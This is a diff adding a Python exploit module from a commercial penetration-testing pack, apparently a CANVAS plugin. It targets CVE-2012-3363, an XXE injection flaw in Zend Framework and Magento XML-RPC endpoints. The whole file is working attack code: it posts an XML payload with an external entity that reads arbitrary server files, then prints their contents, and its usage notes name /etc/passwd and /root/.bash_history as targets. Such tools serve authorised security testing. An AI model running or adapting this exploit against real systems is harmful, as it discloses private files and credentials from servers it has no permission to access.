@@ -1,0 +1,156 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+
+if "." not in sys.path: sys.path.append(".")
+
+import os
+import re
+import StringIO
+import canvasengine
+
+from tcpexploit import tcpexploit
+from exploitutils import standard_callback_commandline
+
+
+NAME = "d2sec_zend_xmlrpc"
+VERSION = "0.1"
+DESCRIPTION = "Multiple Zend Local file disclosure via XXE injection Vulnerabilities"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Vendor"] = "Zend"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2012/06/26"
+DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/19408/"
+DOCUMENTATION["CVE Name"] = "CVE-2012-3363"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3363"
+DOCUMENTATION["Notes"] = """
+Parameter filename must be a pathname listing. For example:
+
+$ 3rdparty/exploits/d2sec_zend_xmlrpc.py -t 192.168.0.5 -O ssl:0 -O filname:"/etc/passwd,/etc/motd,/root/.bash_history"
+"""
+DOCUMENTATION["Vulnerable Applications"] = """
+- Zend (1.11.11, 1.12.0 RC1, 2.0.0 beta4)
+- Magento (<= v1.12.0.1, <= v1.7.0.1 (CE))
+"""
+
+APPS_VULNS = {
+'Zend':    ['1.11.11, 1.12.0 RC1, 2.0.0 beta4', '/xmlrpc_server.php'],
+'Magento': ['<= v1.12.0.1, <= v1.7.0.1 (CE)', '/index.php/api/xmlrpc'],
+}
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 80 
+    self.listpath = ''
+    self.uri = ''
+    self.ssl = 0
+    self.name = NAME
+    self.app = ''
+    self.setInfo(DESCRIPTION)
+	
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.listpath = self.argsDict.get("listpath", self.listpath)
+    self.app = self.argsDict.get("app", self.app)
+    self.ssl = int(self.argsDict.get("ssl",self.ssl))
+    self.uri = self.argsDict.get("uri", self.uri)
+    if ',' in self.listpath:
+      self.listpath = self.listpath.split(',')
+    else:
+      self.listpath = [self.listpath,]
+
+  def display(self, pathname, url):
+    content = StringIO.StringIO()
+    request = ''
+    if self.ssl == 0:
+      request = 'http://%s:%s%s' % (self.host, self.port, url)
+    else:
+      request = 'https://%s:%s%s' % (self.host, self.port, url)
+    postdata = """<?xml version="1.0"?>
+ <!DOCTYPE foo [ 
+  <!ELEMENT methodName ANY >
+  <!ENTITY xxe SYSTEM "file://%s" >]>
+<methodCall>
+  <methodName>&xxe;</methodName>
+</methodCall>
+
+""" % pathname
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, request)
+      c.setopt(pycurl.POST, 1)
+      c.setopt(pycurl.POSTFIELDS, postdata)
+      c.setopt(pycurl.FOLLOWLOCATION, 1)
+      c.setopt(c.WRITEFUNCTION, content.write)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      if self.ssl:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.perform()
+      data = content.getvalue()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 0
+    self.log('[D2] %s' % pathname)
+    self.log('[D2] %s' % ('='*(len(pathname)+5)))
+    if 'Method &quot;' in data:
+      targets = re.findall("<string>Method &quot;(.*?)&quot; does not exist</string>", data, re.DOTALL)[0]
+      targets = targets.split('\n')
+      for target in targets:
+        self.log('%s' % target) 
+    else:
+      self.log('[D2] %s' % data)
+    return 1
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    url = APPS_VULNS[self.app][1]
+    if self.uri:
+      url = "%s%s" % (self.uri, url)
+      if url[0] is not '/':
+        url = "/%s" % url
+    for path in self.listpath:
+      i = self.display(path, url)
+      if i == 0:
+        self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME, self.host, self.port))
+        return 0
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O ssl:[0|1] -O uri:<url> -O listpath:<list of pathnames> -O app:<vuln app>\n"
+    print "With following supported vulnerable applications:"
+    for app,desc in APPS_VULNS.items():
+      print "- %s (%s)" % (app, desc[0])
+    sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
